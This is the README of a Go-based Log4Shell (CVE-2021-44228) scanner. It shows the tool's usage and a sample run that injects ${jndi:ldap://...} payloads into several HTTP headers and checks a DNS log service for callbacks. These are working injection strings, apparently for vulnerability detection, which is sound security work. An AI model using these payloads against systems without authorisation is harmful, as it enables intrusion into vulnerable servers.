# log4shell-looker


```bash
$ go run main.go --help
Usage of main:
  -mode string
        please usage mode [urlpath, header, useragent] (default "[urlpath, header, useragent]")
  -url string
        please enter you url for scan (default "url")


$ go run main.go -mode=useragent -url=http://127.0.0.1:8080
[+++] Your domain generated :  rfcbd0.dnslog.cn
[+++] Your session is :  1s16v8k8fmrmd5rljun51lmur4
[***] Payload :  User-Agent:${jndi:ldap://rfcbd0.dnslog.cn/}
[---] Isn't to vulnerability CVE-2021-44228
#################### 0 ############################
[+++] Your domain generated :  rfcbd0.dnslog.cn
[+++] Your session is :  1s16v8k8fmrmd5rljun51lmur4
[***] Payload :  Referer:${jndi:ldap://rfcbd0.dnslog.cn/}
[---] Isn't to vulnerability CVE-2021-44228
#################### 1 ############################
[+++] Your domain generated :  rfcbd0.dnslog.cn
[+++] Your session is :  1s16v8k8fmrmd5rljun51lmur4
[***] Payload :  X-Forwarded-For:${jndi:ldap://rfcbd0.dnslog.cn/}
[---] Isn't to vulnerability CVE-2021-44228
#################### 2 ############################
[+++] Your domain generated :  rfcbd0.dnslog.cn
[+++] Your session is :  1s16v8k8fmrmd5rljun51lmur4
[***] Payload :  Authentication:${jndi:ldap://rfcbd0.dnslog.cn/}
[---] Isn't to vulnerability CVE-2021-44228
#################### 3 ############################
[+++] Your domain generated :  rfcbd0.dnslog.cn
[+++] Your session is :  1s16v8k8fmrmd5rljun51lmur4
[***] Payload :  X-Api-Version:${jndi:ldap://rfcbd0.dnslog.cn/}
[***] DNS log result :  [["rfcbd0.dnslog.cn","172.253.238.4","2021-12-16 14:45:19"]]
[***] Is Vulnerability to CVE-2021-44228 - [critical]
```
